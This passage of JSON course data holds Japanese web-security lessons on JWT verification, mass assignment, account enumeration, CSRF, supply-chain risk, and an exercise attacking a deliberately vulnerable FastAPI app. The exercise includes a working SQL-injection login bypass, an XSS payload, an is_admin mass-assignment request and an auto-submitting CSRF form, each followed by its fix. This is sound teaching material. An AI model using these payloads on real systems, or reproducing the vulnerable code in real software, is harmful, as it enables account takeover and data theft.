     "body": "## このレッスンのゴール\n\n- JWT の署名を確かめないと、誰でも管理者になれてしまうことを説明できる\n- 「送られてきた値をそのまま保存する」（マスアサインメント）の危険と直し方が分かる\n- アカウントの列挙・総当たり・CSRF とその対策を知り、AI のコードで確認できる\n\nバックエンドコースのレッスン 9（認証と認可）・11（定番 10）・18（OAuth）で学んだ基本の、**一歩先の落とし穴** です。\n\n## ① 署名を確かめない JWT\n\nバックエンドコースのレッスン 9 で、「JWT の中身は誰でも読める。署名で改ざんを防ぐ」と学びました。では、**署名を確かめなかったら** どうなるでしょうか。\n\n```python\nimport jwt\ntoken = jwt.encode({\"sub\": \"2\", \"role\": \"user\"}, SECRET, algorithm=\"HS256\")\n# 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyIiwicm9sZSI6InVzZXIifQ.plsq...'\n#   └ ヘッダー                         └ 中身（Base64）                      └ 署名\n```\n\n攻撃者は、真ん中の部分を `{\"sub\":\"1\",\"role\":\"admin\"}` に書き換えた偽のトークンを作れます（署名はそのまま）。\n\n```python\njwt.decode(forged, options={\"verify_signature\": False})\n# {'sub': '1', 'role': 'admin'}        ← ⚠️ そのまま信じてしまった\n\njwt.decode(forged, SECRET, algorithms=[\"HS256\"])\n# jwt.exceptions.InvalidSignatureError: Signature verification failed   ← ✅ 見破った\n```\n\n（PyJWT 2.15 で実際に試しました）\n\nAI のコードで `verify_signature: False` を見かけるのは、「とりあえず中身を読みたい」ときに書かれたものが残っている場合が多いです。**ログインの判定に使うなら、必ず署名を確かめます**。\n\n### `alg: none` の罠\n\nJWT のヘッダーには、署名の方式（`alg`）が書かれています。昔のライブラリには、ヘッダーに `\"alg\": \"none\"`（署名なし）と書かれていると、**署名を確かめずに受け入れてしまう** ものがありました。\n\n```python\njwt.decode(none_token, SECRET, algorithms=[\"HS256\"])\n# jwt.exceptions.InvalidAlgorithmError: The specified alg value is not allowed\n```\n\n今の PyJWT は、`algorithms=[\"HS256\"]` で **受け入れる方式を自分で決める** ので、`none` は拒否されます。`algorithms` を必ず指定するのがポイントです。\n\n## ② 送られてきた値をそのまま保存する（マスアサインメント）\n\nプロフィールの更新 API で、送られてきた JSON をそのまま反映するコードです。\n\n```python\nuser = {\"id\": 2, \"name\": \"ryo\", \"is_admin\": False}\nbody = {\"name\": \"Ryo\", \"is_admin\": True}          # ← 攻撃者が is_admin を勝手に足した\n\nuser.update(body)\n# {'id': 2, 'name': 'Ryo', 'is_admin': True}     ← ⚠️ 管理者になってしまった\n```\n\n画面には「名前」の欄しかなくても、**リクエストは自由に作れる**（レッスン 1）ので、`is_admin`・`role`・`price`・`user_id` などを足して送られます。\n\n### 直し方：変えてよい項目を決める\n\n```python\nALLOWED = {\"name\", \"bio\"}\nuser.update({k: v for k, v in body.items() if k in ALLOWED})\n# {'id': 2, 'name': 'Ryo', 'is_admin': False}    ← ✅ is_admin は無視された\n```\n\nFastAPI なら、**入力用のモデルを別に作る** のが定番です。\n\n```python\nclass ProfileUpdate(BaseModel):     # 利用者が変えてよいものだけ\n    name: str\n    bio: str | None = None\n\nclass User(BaseModel):              # データベースの中身（is_admin を含む）\n    id: int\n    name: str\n    bio: str | None\n    is_admin: bool\n\n@app.patch(\"/me\")\ndef update_me(data: ProfileUpdate, user: User = Depends(current_user)):\n    ...   # data には name と bio しか入らない（is_admin を送っても無視される）\n```\n\nORM で `User(**request.json)`、JavaScript で `Object.assign(user, req.body)` や `{ ...user, ...req.body }` を見たら、同じ穴を疑います。\n\n## ③ エラーメッセージで会員かどうかがばれる\n\n```text\n⚠️ 「そのメールアドレスは登録されていません」\n⚠️ 「パスワードが違います」\n```\n\nこの 2 つを出し分けると、攻撃者は **どのメールアドレスが会員か** を調べられます（アカウントの列挙）。会員だと分かったアドレスに、パスワードの総当たりやフィッシングメールを集中させます。\n\n```text\n✅ 「メールアドレスまたはパスワードが違います」\n✅ （パスワードリセット）「登録されていれば、メールを送りました」\n```\n\n## ④ 総当たりし放題\n\nログインの API に回数の制限が無いと、よくあるパスワードを 1 秒に何百回も試されます。\n\n| 対策 | 内容 |\n|---|---|\n| **レート制限** | 同じ IP・同じアカウントから、1 分に 5 回までなど（`slowapi`、`express-rate-limit`、Cloudflare の設定） |\n| 失敗が続いたら待たせる | 5 回失敗したら 15 分ロック、など。⚠️ 永久ロックは、他人にわざと失敗されて使えなくなる |\n| 2 段階認証（MFA） | パスワードが当たっても、もう 1 つの確認が必要 |\n| 漏れたパスワードの拒否 | 「password」「12345678」などを登録させない |\n\nパスワードリセットや確認コードの入力も、同じように制限が必要です。6 桁のコードは 100 万通りしかないので、制限が無ければ総当たりで当たります。\n\n## ⑤ CSRF：知らないうちに操作させられる\n\nあなたが銀行のサイトにログインしたまま、攻撃者の罠サイトを開いたとします。罠サイトには、こんなフォームが隠されています。\n\n```html\n<form action=\"https://bank.example/transfer\" method=\"POST\" id=\"f\">\n  <input name=\"to\" value=\"攻撃者の口座\">\n  <input name=\"amount\" value=\"100000\">\n</form>\n<script>document.getElementById(\"f\").submit()</script>\n```\n\nブラウザは、bank.example へのリクエストに **bank.example のログイン Cookie を自動で付けて** しまいます。銀行から見ると、本人からの正しい送金依頼に見えます。これが **CSRF**（クロスサイト・リクエスト・フォージェリ）です。\n\n| 対策 | 仕組み |\n|---|---|\n| Cookie に `SameSite=Lax`（または `Strict`） | 他のサイトからの POST には Cookie を付けない。今のブラウザの多くは、指定が無いと Lax 扱い |\n| CSRF トークン | フォームに、そのサイトだけが知っているランダムな値を入れ、サーバーで確かめる（Django・Rails などは標準装備） |\n| 大事な操作は再確認 | 送金・パスワード変更の前に、パスワードの再入力 |\n| 状態を変える操作に GET を使わない | `GET /delete?id=3` は、画像のタグ `<img src=\"...\">` だけで実行されてしまう |\n\nトークンを `Authorization` ヘッダーで送る API（ブラウザが自動で付けない）なら、CSRF は起きにくくなります。その代わり、トークンを JavaScript から読める場所に置くことになるので、XSS（レッスン 4）に注意が必要です。\n\n## Cookie の設定（おさらい）\n\n| 設定 | 守るもの |\n|---|---|\n| `HttpOnly` | JavaScript から読めない → XSS で盗まれにくい |\n| `Secure` | https のときだけ送る → 通信の途中で盗まれにくい |\n| `SameSite=Lax` | 他のサイトからのリクエストに付けない → CSRF |\n| 短めの有効期限・ログアウトで無効化 | 盗まれたときの被害を小さく |\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 判定 |\n|---|---|\n| `jwt.decode(..., options={\"verify_signature\": False})` | ⚠️ ログイン判定に使っているなら致命的 |\n| `jwt.decode(token, key)`（`algorithms` が無い） | ⚠️ PyJWT 2 では必須。他のライブラリでも方式を固定する |\n| `user.update(request.json)` / `User(**body)` / `Object.assign(user, req.body)` | ⚠️ マスアサインメント。入力用のモデルか許可リストに |\n| ログインのエラーが「登録されていません」「パスワードが違います」で分かれている | ⚠️ アカウントの列挙 |\n| `/login` にレート制限が無い | ⚠️ 総当たり |\n| `@app.get(\"/delete/{id}\")` | ⚠️ 状態を変える操作は POST / DELETE に |\n| `set_cookie(\"session\", ..., httponly=True, secure=True, samesite=\"lax\")` | ✅ |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`jwt.decode(token, options={\"verify_signature\": False})` の結果でログイン中のユーザーを決めている。何が起きる？",
        "choices": [
         "処理が速くなるだけで、問題はない",
         "攻撃者が中身を書き換えた偽のトークンでも受け入れてしまい、誰にでもなりすませる",
         "トークンの期限が切れなくなるだけ"
        ],
        "answer": 1,
        "explain": "署名を確かめないと、`{\"sub\": \"1\", \"role\": \"admin\"}` のように書き換えた偽物を見破れません。実際に試すと、偽物の中身がそのまま返ってきました。"
       },
       {
        "question": "プロフィール更新 API で `user.update(request.json)` としている。攻撃者がやりそうなことは？",
        "choices": [
         "名前を長くする",
         "`is_admin: true` などをリクエストに足して、自分を管理者にする",
         "何もできない（画面に is_admin の欄が無いので）"
        ],
        "answer": 1,
        "explain": "リクエストは自由に作れるので、画面に無い項目も送れます。変えてよい項目だけを受け取るようにします。"
       },
       {
        "question": "ログイン画面のエラーメッセージとして、もっとも適切なのは？",
        "choices": [
         "「このメールアドレスは登録されていません」",
         "「パスワードが 1 文字違います」",
         "「メールアドレスまたはパスワードが違います」"
        ],
        "answer": 2,
        "explain": "どちらが違うかを出し分けると、どのメールアドレスが会員かを調べられてしまいます。"
       }
      ]
     ],
     "id": "05-auth-pitfalls"
    },
    {
     "title": "依存ライブラリとサプライチェーン ― 自分で書いていないコードの守り方",
     "level": 3,
     "minutes": 18,
     "concepts": [
      "security",
      "tooling",
      "ai_coding"
     ],
     "summary": "アプリのコードの大半は、他人が書いたライブラリ。古いバージョンの脆弱性を pip-audit で実際に検出し、ロックファイル・自動更新・名前の似た偽物・AI が作り出す「存在しないパッケージ」への対策まで。",
     "body": "## このレッスンのゴール\n\n- 依存ライブラリの脆弱性を、`pip-audit`・`npm audit` で調べる方法と、結果の読み方が分かる\n- ロックファイルとバージョンの固定の役割を説明できる\n- タイポスクワッティングや、AI が提案する「存在しないパッケージ」の危険に気づける\n\n## 自分のコードは氷山の一角\n\n`pip install fastapi` を 1 回実行すると、FastAPI が使う別のライブラリ（starlette・pydantic・anyio…）も一緒に入ります。JavaScript では `npm install` で何百ものパッケージが入ることも珍しくありません。\n\n```text\n自分のアプリ\n ├─ fastapi            ← 自分で選んだもの（直接の依存）\n │   ├─ starlette      ← fastapi が使うもの（間接の依存）\n │   └─ pydantic\n │       └─ ...\n └─ requests\n     ├─ urllib3\n     └─ idna\n```\n\n**アプリとして動くコードの大半は、他人が書いたもの** です。そこに穴があれば、自分のアプリにも穴があることになります。このように、材料（ライブラリ）の側から攻撃されることを **サプライチェーン攻撃** と呼びます。\n\n## 古いバージョンには、知られた穴がある\n\nライブラリの脆弱性は、見つかると番号（CVE・PYSEC・GHSA など）が付けられ、データベースで公開されます。`pip-audit` は、それと自分の依存を照らし合わせてくれます。\n\n```text\n$ cat requirements.txt\nrequests==2.19.0\n\n$ pip-audit -r requirements.txt --desc off\nFound 37 known vulnerabilities in 3 packages\nName     Version ID              Fix Versions\n-------- ------- --------------- -------------\nrequests 2.19.0  PYSEC-2018-28   2.20.0\nrequests 2.19.0  PYSEC-2023-74   2.31.0\n...\nurllib3  1.23    PYSEC-2023-212  1.26.18,2.0.7\n...\n```\n\n（2018 年の requests 2.19.0 で、実際に実行した結果の一部です）\n\n| 列 | 意味 |\n|---|---|\n| Name / Version | どのライブラリの、どのバージョンか。`urllib3` は自分で書いていないが、requests が連れてきた間接の依存 |\n| ID | 脆弱性の番号。検索すると内容が分かる |\n| Fix Versions | **このバージョン以上にすれば直る** |\n\n`requests` 1 つを古いまま使っただけで、**連れてきた urllib3・idna も含めて 37 件**（同じものの重複を含む）見つかりました。\n\n| 言語 | 調べるコマンド |\n|---|---|\n| Python | `pip-audit`（`pip install pip-audit`） |\n| JavaScript | `npm audit`（npm に最初から入っている） |\n| GitHub | **Dependabot**：リポジトリの設定で有効にすると、脆弱性のある依存を見つけて、更新の PR を自動で作ってくれる |\n\n⚠️ `npm audit fix --force` は、大きなバージョンアップ（互換性の無い変更）までまとめて行うので、アプリが動かなくなることがあります。更新した後はテストを実行します。\n\n## バージョンを固定する：ロックファイル\n\n```text\nrequests           ← ⚠️ 入れるたびに最新になる。昨日と今日で中身が違うかも\nrequests>=2.31     ← 2.31 以上なら何でも\nrequests==2.32.4   ← ✅ このバージョンだけ\n```\n\n直接の依存だけでなく、**間接の依存まで含めて、全部のバージョンを記録したファイル** が **ロックファイル** です。\n\n| 道具 | ロックファイル |\n|---|---|\n| npm | `package-lock.json` |\n| pnpm / yarn | `pnpm-lock.yaml` / `yarn.lock` |\n| uv / Poetry（Python） | `uv.lock` / `poetry.lock` |\n| pip | `pip freeze > requirements.txt`（簡易版） |\n\nロックファイルをコミットしておくと、**誰がいつインストールしても同じものが入ります**。「昨日まで動いていたのに、新しいバージョンが出て壊れた」「乗っ取られた最新版が入った」を防げます。\nその代わり、固定したままだと古くなっていくので、Dependabot などで **定期的に、確認しながら上げていく** のがセットです。\n\n## 偽物のパッケージ\n\n### タイポスクワッティング\n\n人気のパッケージと **1 文字違いの名前** で、悪意のあるパッケージを公開する手口です。\n\n```text\nrequests  ← 本物\nreqeusts  ← 偽物の例（打ち間違いを狙う）\npython-requests、requests-py ← それっぽい名前の偽物の例\n```\n\nインストールしただけで、パソコンの中の秘密（SSH の鍵、`.env`、ブラウザに保存されたパスワード）を送信するものが、実際に何度も見つかっています。Python・npm のパッケージは、インストールのときにプログラムを実行できるからです。\n\n### AI が「存在しないパッケージ」を提案する\n\nAI は、**もっともらしいけれど存在しないパッケージ名** を答えることがあります（AI と開発するコースの「ハルシネーション」）。攻撃者がその名前を先に登録しておくと、AI の提案どおりにインストールした人が被害にあいます。これは **スロップスクワッティング** と呼ばれ、AI での開発ならではの新しい危険です。\n\n### インストールする前に確かめること\n\n| 確認 | 方法 |\n|---|---|\n| 本当にあるか・公式か | PyPI（pypi.org）・npm（npmjs.com）のページを開く。公式ドキュメントからリンクされているか |\n| 使われているか | ダウンロード数、GitHub のスター、最終更新日 |\n| 名前は正確か | 1 文字ずつ見る。公式ドキュメントからコピーする |\n| 本当に必要か | 標準ライブラリや、すでに入っているもので足りないか |\n\n## 依存は少ないほど安全\n\nライブラリ 1 つを足すことは、**その作者と、その作者が使っているライブラリ全部を信用する** ということです。数行で書ける処理のために依存を増やさないのも、立派なセキュリティ対策です。\nこのサイトが、外部のライブラリを 3 つ（Markdown の変換・サニタイズ・コードの色付け）だけ、`site/vendor/` に、ファイルとして同梱しているのも、毎回ネットから取ってこない・増やさないための工夫です。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `pip install 聞いたことのない名前` / `npm install ...` | PyPI・npm のページで、本物か・使われているかを確認 |\n| `requirements.txt` にバージョンの指定が無い | ⚠️ 入れるたびに変わる。固定するか、ロックファイルを使う |\n| `package-lock.json` を `.gitignore` に入れている | ⚠️ ロックファイルはコミットする |\n| 何年も前のバージョンが固定されたまま | ⚠️ `pip-audit` / `npm audit` で確認 |\n| `npm audit fix --force` を勧めてくる | ⚠️ 大きなバージョンアップを含む。実行後にテスト |\n| `<script src=\"https://どこかのCDN/...\">` | 配布元が乗っ取られると影響を受ける。`integrity=\"sha384-...\"`（中身が変わっていないかの確認）があると ✅ |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`pip-audit` の結果で `urllib3 1.23 ... Fix Versions 1.26.18` と出たが、自分は urllib3 をインストールした覚えがない。なぜ？",
        "choices": [
         "pip-audit の間違い",
         "自分が入れた requests などが、urllib3 を間接の依存として連れてきたから",
         "Python に最初から入っているから"
        ],
        "answer": 1,
        "explain": "ライブラリは別のライブラリを使っています。間接の依存の脆弱性も、自分のアプリの脆弱性になります。"
       },
       {
        "question": "ロックファイル（`package-lock.json` など）をコミットする主な理由は？",
        "choices": [
         "ファイルの容量を減らすため",
         "間接の依存まで含めて、誰がいつインストールしても同じバージョンが入るようにするため",
         "ライブラリを自動で最新にするため"
        ],
        "answer": 1,
        "explain": "全部のバージョンが固定されるので、意図しない更新や、乗っ取られた最新版が入るのを防げます。更新は確認しながら別に行います。"
       },
       {
        "question": "AI が「この処理には `fastjson-parser-pro` を使うとよいです」と提案してきた。まずすることは？",
        "choices": [
         "すぐに `pip install fastjson-parser-pro` を実行する",
         "PyPI で本当に存在するか、公式のものか、使われているかを確認する（標準ライブラリで足りないかも考える）",
         "AI が言うなら確実に存在するので、気にしない"
        ],
        "answer": 1,
        "explain": "AI は存在しないパッケージ名を答えることがあり、その名前で悪意のあるパッケージが登録されている場合があります。インストールの前に確認します。"
       }
      ]
     ],
     "id": "06-dependencies"
    },
    {
     "title": "総合演習 ― AI が書いた API の穴を探す",
     "level": 4,
     "minutes": 25,
     "concepts": [
      "security",
      "backend",
      "reading",
      "ai_coding"
     ],
     "summary": "「動くけれど穴だらけ」の FastAPI のコードを読み、このコースで学んだ穴を探す。実際に攻撃して成功することを確かめ、直した版で同じ攻撃が防がれることまで確認する。",
     "body": "## このレッスンのゴール\n\n- このコースのチェックポイントを使って、短い API のコードから脆弱性を見つけられる\n- 見つけた穴が「なぜ危ないか」「どう直すか」を、自分の言葉で説明できる\n- 直した後に、同じ攻撃で確かめるという進め方が分かる\n\n## 問題のコード\n\nAI に「メールアドレスとパスワードで登録・ログインできて、メモを見られる API を FastAPI で作って」と頼んだら、こんなコードが出てきたとします。**普通に使う分には、ちゃんと動きます**。\n\n```python\nimport hashlib, sqlite3\nfrom fastapi import FastAPI, Request\nfrom fastapi.responses import HTMLResponse\n\napp = FastAPI()\nSECRET_KEY = \"dev-secret-123\"\nconn = sqlite3.connect(\":memory:\", check_same_thread=False)\nconn.executescript(\"\"\"\nCREATE TABLE users (id INTEGER PRIMARY KEY, email TEXT, password TEXT, is_admin INTEGER DEFAULT 0);\nCREATE TABLE notes (id INTEGER PRIMARY KEY, owner_id INTEGER, body TEXT);\n\"\"\")\n\n@app.post(\"/signup\")\nasync def signup(request: Request):\n    data = await request.json()\n    pw = hashlib.md5(data[\"password\"].encode()).hexdigest()\n    cols = \", \".join(data.keys())\n    conn.execute(f\"INSERT INTO users ({cols}) VALUES ({', '.join('?' * len(data))})\",\n                 [pw if k == \"password\" else v for k, v in data.items()])\n    conn.commit()\n    return {\"ok\": True}\n\n@app.post(\"/login\")\nasync def login(request: Request):\n    data = await request.json()\n    pw = hashlib.md5(data[\"password\"].encode()).hexdigest()\n    row = conn.execute(\n        f\"SELECT id FROM users WHERE email = '{data['email']}' AND password = '{pw}'\"\n    ).fetchone()\n    if row is None:\n        return {\"error\": \"ログインできません\"}\n    return {\"user_id\": row[0]}\n\n@app.get(\"/notes/{note_id}\", response_class=HTMLResponse)\ndef show_note(note_id: int):\n    row = conn.execute(\"SELECT body FROM notes WHERE id = ?\", (note_id,)).fetchone()\n    return f\"<h1>メモ</h1><div>{row[0]}</div>\"\n```\n\n### ✏️ まず自分で探してみる\n\n先を読む前に、レッスン 1 の「見る順番」で探してみましょう。**8 個以上** あります。\n\n1. 外から来るデータはどこから入る？\n2. それは SQL・HTML にそのまま使われていない？\n3. パスワード・秘密の扱いは？\n4. 「誰が」「何を」してよいかを確かめている？\n5. 予想外の入力（無い ID など）で、どうなる？\n\n## 答え合わせ\n\n| # | 場所 | 穴 | レッスン |\n|---|---|---|---|\n| ① | `SECRET_KEY = \"dev-secret-123\"` | 秘密がコードに直接書かれている（Git に残る・短くて推測しやすい） | AI と開発するコース |\n| ② | `hashlib.md5(...)` | パスワードを MD5 で保存。盗まれたら総当たりですぐ戻される。ソルトも無い | 2 |\n| ③ | `signup` の `data.keys()` をそのまま列名に | **マスアサインメント**：`\"is_admin\": 1` を送れば管理者で登録できる | 5 |\n| ④ | 同じく `cols` を f 文字列で SQL に | 列名の部分に **SQL インジェクション**（キーの名前に SQL を仕込める） | 3 |\n| ⑤ | `login` の f 文字列の SQL | **SQL インジェクション**：パスワードを知らなくてもログインできる | 3 |\n| ⑥ | `show_note` の `f\"<div>{row[0]}</div>\"` | **XSS**：メモの中身の HTML がそのまま表示される | 4 |\n| ⑦ | `show_note` に、ログインや持ち主の確認が無い | **IDOR**：ID を変えるだけで、誰のメモでも読める | バックエンドコース 9 |\n| ⑧ | `row` が `None` のとき | 無い ID で `TypeError` → 500 エラー。エラーの詳細が漏れることもある | バックエンドコース 10 |\n| ⑨ | `email` が `UNIQUE` でない・型のチェックが無い | 同じメールアドレスで何人も登録できる。`password` が無いと `KeyError` | データベース設計コース |\n| ⑩ | `/login` に回数の制限が無い | 総当たりし放題 | 5 |\n\n## 実際に攻撃してみる\n\nFastAPI の `TestClient`（実際のサーバーを立てずにリクエストを送れる道具。バックエンドコースのレッスン 12）で、穴を突いてみました。\n\n```python\nc.post(\"/signup\", json={\"email\": \"ryo@example.com\", \"password\": \"hana-2027\"})\n\n# ③ マスアサインメント\nc.post(\"/signup\", json={\"email\": \"evil@example.com\", \"password\": \"x\", \"is_admin\": 1})\nconn.execute(\"SELECT email, is_admin FROM users\").fetchall()\n# [('ryo@example.com', 0), ('evil@example.com', 1)]      ← 管理者として登録できた\n\n# ⑤ SQL インジェクション\nc.post(\"/login\", json={\"email\": \"ryo@example.com' --\", \"password\": \"wrong\"}).json()\n# {'user_id': 1}                                         ← パスワードが違うのにログインできた\n\n# ⑥ XSS（メモに HTML が入っていた場合）\nc.get(\"/notes/1\").text\n# '<h1>メモ</h1><div><img src=x onerror=alert(1)></div>'   ← そのまま出てくる\n\n# ⑧ 無い ID\nc.get(\"/notes/999\").status_code\n# 500\n```\n\n⑤ の入力 `ryo@example.com' --` は、`'` でメールアドレスの文字列を閉じ、`--` で **後ろのパスワードの条件をコメントにして消して** います。SQL は `... WHERE email = 'ryo@example.com' --' AND password = '...'` になり、メールアドレスだけで判定されました。\n\n## 直した版\n\n```python\nimport html, os, sqlite3\nfrom argon2 import PasswordHasher\nfrom argon2.exceptions import VerifyMismatchError\nfrom fastapi import FastAPI, HTTPException, Header\nfrom fastapi.responses import HTMLResponse\nfrom pydantic import BaseModel, EmailStr\n\napp = FastAPI()\nSECRET_KEY = os.environ[\"SECRET_KEY\"]                                   # ① 環境変数から\nph = PasswordHasher()\nconn = sqlite3.connect(\":memory:\", check_same_thread=False)\nconn.executescript(\"\"\"\nCREATE TABLE users (id INTEGER PRIMARY KEY, email TEXT NOT NULL UNIQUE,   -- ⑨ UNIQUE と NOT NULL\n                    password_hash TEXT NOT NULL, is_admin INTEGER NOT NULL DEFAULT 0);\nCREATE TABLE notes (id INTEGER PRIMARY KEY, owner_id INTEGER NOT NULL REFERENCES users(id), body TEXT NOT NULL);\n\"\"\")\n\nclass Credentials(BaseModel):                                           # ③⑨ 受け取るのはこの 2 つだけ\n    email: EmailStr\n    password: str\n\n@app.post(\"/signup\")\ndef signup(data: Credentials):\n    try:\n        with conn:\n            conn.execute(\"INSERT INTO users (email, password_hash) VALUES (?, ?)\",   # ④ 列は固定\n                         (data.email, ph.hash(data.password)))                        # ② Argon2\n    except sqlite3.IntegrityError:\n        raise HTTPException(409, \"登録できませんでした\")\n    return {\"ok\": True}\n\n@app.post(\"/login\")\ndef login(data: Credentials):\n    row = conn.execute(\"SELECT id, password_hash FROM users WHERE email = ?\",        # ⑤ プレースホルダ\n                       (data.email,)).fetchone()\n    try:\n        if row is None:\n            raise VerifyMismatchError\n        ph.verify(row[1], data.password)\n    except VerifyMismatchError:\n        raise HTTPException(401, \"メールアドレスまたはパスワードが違います\")   # どちらが違うか言わない\n    return {\"user_id\": row[0]}           # 実際はここでセッションや JWT を発行する\n\n@app.get(\"/notes/{note_id}\", response_class=HTMLResponse)\ndef show_note(note_id: int, x_user_id: int = Header()):    # 説明を短くするためヘッダーで受け取っている\n    row = conn.execute(\"SELECT body FROM notes WHERE id = ? AND owner_id = ?\",       # ⑦ 持ち主の確認\n                       (note_id, x_user_id)).fetchone()\n    if row is None:\n        raise HTTPException(404, \"メモが見つかりません\")                       # ⑧ 500 ではなく 404\n    return f\"<h1>メモ</h1><div>{html.escape(row[0])}</div>\"                    # ⑥ エスケープ\n```\n\n⚠️ `x_user_id` をヘッダーで受け取っているのは、**この演習を短くするため** です。本物のアプリでは、利用者が自由に書き換えられるヘッダーを信じてはいけません。ログインしたときに発行したセッションや、署名を確かめた JWT（レッスン 5）から取り出します。\n⑩ のレート制限は、`slowapi` などのライブラリや、Cloudflare などの手前の仕組みで足します（ここでは省略）。\n\n### 同じ攻撃で確かめる\n\n```text\n③ マスアサインメント   → [('ryo@example.com', 0), ('evil@example.com', 0)]   is_admin は無視された\n   同じメールで再登録   → 409\n⑤ SQL インジェクション → 422（メールアドレスの形ではないので、Pydantic が受け付けない）\n   パスワード違い       → {'detail': 'メールアドレスまたはパスワードが違います'}\n   存在しないユーザー   → {'detail': 'メールアドレスまたはパスワードが違います'}   ← 同じ文言\n⑥ XSS                  → <div>&lt;img src=x onerror=alert(1)&gt;</div>           文字として表示\n⑦ 他人のメモ           → 404\n⑧ 無い ID              → 404\n```\n\n（直した版を実際に動かして、上の攻撃をもう一度送った結果です）\n\n⑤ は Pydantic の形のチェックで先に止まりましたが、**本当の守りはプレースホルダ** です。メールアドレスの形をしていても、`?` で渡していれば命令にはなりません。**1 つの対策に頼らない**（多層防御）のがポイントです。\n\n### さらに一歩先\n\n存在しないユーザーのときは `ph.verify` を呼ばずにすぐ返しているので、**返事の速さ** で会員かどうかが分かってしまう可能性が残っています（Argon2 の確認は時間がかかるため）。気にする場合は、ユーザーがいないときもダミーのハッシュで `verify` を実行して、時間をそろえます。セキュリティは、このように **1 つ直すと次が見えてくる** ものです。\n\n## AI に頼むときのコツ\n\nこのコードは、「登録・ログイン・メモを見る API」という頼み方に、**機能としては正しく** 答えています。セキュリティは、頼まないと後回しにされがちです。\n\n```text\n✅ 頼み方の例\nFastAPI で登録・ログイン API を作ってください。\n- パスワードは Argon2 でハッシュ化\n- SQL は必ずプレースホルダ\n- 入力は Pydantic のモデルで、受け取る項目を限定\n- 他人のデータは見られないように、持ち主を確認\n- エラーメッセージでアカウントの有無が分からないように\n作った後、このコードの脆弱性を自分で 5 つ以上探して、直してください。\n```\n\nそして、出てきたコードは **このレッスンの表で、自分でも確認** します。AI の「直しました」も、実際に攻撃を送って確かめるのが確実です。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "問題のコードの `/login` に `{\"email\": \"ryo@example.com' --\", \"password\": \"wrong\"}` を送るとログインできた。`--` の役割は？",
        "choices": [
         "メールアドレスの区切り",
         "SQL のコメントの始まりで、後ろのパスワードの条件を無視させている",
         "パスワードを空にする命令"
        ],
        "answer": 1,
        "explain": "`--` から後ろはコメントになるので、`AND password = '...'` が消え、メールアドレスだけで判定されてしまいました。"
       },
       {
        "question": "直した版で、`is_admin` を送っても管理者にならなくなったのは、どの変更のおかげ？",
        "choices": [
         "パスワードを Argon2 にしたから",
         "入力を `Credentials`（email と password だけ）のモデルで受け取り、INSERT する列も固定したから",
         "`html.escape` を使ったから"
        ],
        "answer": 1,
        "explain": "受け取る項目を決めておけば、余計な項目は無視されます。マスアサインメントの対策です。"
       },
       {
        "question": "直した版の `/notes/{note_id}` で、`WHERE id = ? AND owner_id = ?` にした目的は？",
        "choices": [
         "検索を速くするため",
         "XSS を防ぐため",
         "ログイン中の人のメモだけを返し、ID を変えて他人のメモを読まれないようにするため"
        ],
        "answer": 2,
        "explain": "「その人のデータか」を確かめる認可のチェックです。無いと、ID を 1 つずつ変えるだけで全員のメモが読めてしまいます（IDOR）。"
       }
      ]
     ],
     "id": "07-review-exercise"
    }
   ],
   "status": "open"
  },
  {
   "title": "データベース設計",
   "icon": "🗃️",
   "order": 140,
   "category": "topic",
   "description": "テーブルの分け方と、データの関係の表し方。主キー・外部キー・1 対多と多対多・正規化・インデックス・制約とトランザクション、ORM の関係の読み方まで。コード例は Python の sqlite3 と SQLAlchemy。",
   "levels": {
    "1": "入門：表を作る",
    "2": "基礎：関係を表す",
    "3": "実践：速く・壊れにくく",
    "4": "応用：ORM で読む"
   },
   "id": "140-database-design",
   "lessons": [
    {
     "title": "テーブルと主キー ― 何を 1 行にするか",
     "level": 1,
     "minutes": 15,
     "concepts": [
      "database",
      "types"
     ],
     "summary": "「もの」ごとにテーブルを作り、1 行を 1 件にする。列の型、NOT NULL、主キーの選び方（連番・UUID・メールアドレスはなぜダメか）。",
     "body": "## このレッスンのゴール\n\n- アプリの「もの」から、テーブルと列を考えられる\n- 主キーの役割と、連番・UUID の違いを説明できる\n- `CREATE TABLE` を読んで、どんなデータが入るのか・入らないのかが分かる\n\nバックエンドコースのレッスン 7（SQL と CRUD）で、テーブル・行・列・主キーという言葉と、`SELECT`・`INSERT` を学びました。このコースでは、**どんなテーブルを作るか（設計）** を考えます。\n\n## まず「もの」を見つける\n\nブログアプリを作るとしたら、登場する「もの」（**エンティティ** と呼びます）は何でしょうか。\n\n| もの | 持っている情報 |\n|---|---|\n| ユーザー | 名前・メールアドレス・登録日 |\n| 投稿 | タイトル・本文・書いた人・投稿日 |\n| コメント | 本文・書いた人・どの投稿へのコメントか |\n| タグ | 名前（「日記」「Python」） |\n\n基本は **1 つの「もの」＝ 1 つのテーブル、1 件 ＝ 1 行** です。テーブル名は複数形（`users`・`posts`）にすることが多いです。\n\n## 列を決める\n\n```sql\nCREATE TABLE users (\n  id          INTEGER PRIMARY KEY,\n  name        TEXT    NOT NULL,\n  email       TEXT    NOT NULL UNIQUE,\n  created_at  TEXT    NOT NULL DEFAULT CURRENT_TIMESTAMP\n);\n```\n\n| 書き方 | 意味 |\n|---|---|\n| `INTEGER` / `TEXT` | 列の型（整数・文字列）。他に `REAL`（小数）など |\n| `NOT NULL` | 空（NULL）を許さない |\n| `UNIQUE` | 同じ値を 2 行に入れられない |\n| `DEFAULT ...` | 省略したときの値。`CURRENT_TIMESTAMP` は今の日時 |\n| `PRIMARY KEY` | 主キー（下で説明） |\n\n```python\nconn.execute(\"INSERT INTO users (name, email) VALUES (NULL, 'z@example.com')\")\n# sqlite3.IntegrityError: NOT NULL constraint failed: users.name\n\nconn.execute(\"INSERT INTO users (name, email) VALUES ('X', 'hana@example.com')\")   # すでにある\n# sqlite3.IntegrityError: UNIQUE constraint failed: users.email\n```\n\n（実行して確認したエラーです）**データベース自身にルールを持たせておくと、プログラムのバグがあってもおかしなデータが入りません**。\n\n### ⚠️ SQLite の型はゆるい\n\n```python\nconn.execute(\"CREATE TABLE t (n INTEGER)\")\nconn.execute(\"INSERT INTO t VALUES ('abc')\")        # エラーにならない！\nconn.execute(\"SELECT n, 